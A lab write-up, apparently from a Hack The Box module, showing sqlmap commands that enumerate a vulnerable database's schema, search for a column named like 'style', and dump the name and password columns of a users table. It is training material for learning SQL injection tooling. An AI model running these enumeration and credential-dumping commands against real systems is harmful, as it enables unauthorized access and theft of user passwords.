# SQLMap – Advanced Database Enumeration

## Objective

Practice advanced SQL injection enumeration techniques with SQLMap and retrieve specific information from a vulnerable database.

---

## Case #1 – Finding a Column Containing "style"

### Goal

Identify the name of the column containing the word **"style"**.

### Initial Approach

I first attempted to enumerate the whole database schema:

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

Although this provided all databases, tables, and columns, the amount of information made it difficult to manually locate the desired column.

### Optimized Approach

Instead of searching manually, I used SQLMap's search feature to look for columns containing the keyword `style`:

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C style --batch
```

### Result

SQLMap returned the column:

```
PARAMETER_STYLE
```

This solved the first challenge efficiently without having to inspect the entire schema manually.

---

## Case #1 – Retrieving Kimberly's Password

### Goal

Find the password associated with the user **Kimberly**.

### Step 1 – Identify the Database and Table

Since HTB labs commonly use the `testdb` database and a `users` table, I started by enumerating the table columns:

```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch
```

This revealed the relevant columns:

* `name`
* `password`

### Step 2 – Dump Only the Required Data

To avoid unnecessary output, I dumped only the `name` and `password` columns:

```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump -C name,password --batch
```

### Result

The output contained the credentials of all users, allowing me to identify Kimberly's password.

---

## Key Takeaways

* `--schema` provides a complete overview of the database structure, but can generate excessive output.
* `--search` is useful for quickly locating databases, tables, or columns based on keywords.
* `--columns` allows targeted enumeration of table structures.
* `--dump -C` makes data extraction more efficient by retrieving only specific columns.
* Limiting enumeration to the necessary information reduces noise and speeds up the process.

## Commands Used

```bash
# Enumerate schema
sqlmap -u "http://www.example.com/?id=1" --schema

# Search for columns containing "style"
sqlmap -u "http://www.example.com/?id=1" --search -C style --batch

# Enumerate columns in users table
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch

# Dump only name and password columns
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump -C name,password --batch
```

## Skills Practiced

* SQL Injection Enumeration
* Database Schema Discovery
* Targeted Data Extraction
* SQLMap Automation
* Information Gathering
* Efficient Enumeration Techniques
